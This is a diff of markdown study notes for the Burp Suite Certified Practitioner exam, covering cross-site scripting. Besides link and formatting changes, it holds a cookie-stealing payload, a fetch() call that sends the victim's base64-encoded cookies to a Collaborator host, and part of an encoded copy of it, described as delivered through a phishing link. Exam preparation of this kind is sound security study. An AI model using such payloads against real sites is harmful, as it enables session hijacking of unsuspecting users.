@@ -4,12 +4,13 @@ PortSwigger Academy - Burp Suite Certified Practitioner Exam Study Notes
 
 ## Cross Site Scripting
 
-+ [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet){:target="_blank"}  
++ [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
++ [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  
 
 ### Cookie Stealers
 
 #### Reflected XSS in Search
-Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload
+>Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload
 <sub>WAF is preventing dangerous search filters and tags!</sub>
 ```JavaScript
 fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
@@ -29,9 +30,9 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 ```
 ![(Deliver reflected xss to steal victim cookie.](deliver-reflected-xss-to-steal-victim-cookie.png)
 
-##### URL and Base64 online encoders and decoders  
-[URL Decode and Encode](https://www.urldecoder.org/){:target="_blank"}
-[BASE64 Decode and Encode](https://www.base64encode.org/){:target="_blank"}  
+#### URL and Base64 online encoders and decoders  
+[URL Decode and Encode](https://www.urldecoder.org/) 
+[BASE64 Decode and Encode](https://www.base64encode.org/)    
   
 #### Blog post comment section
 ```html
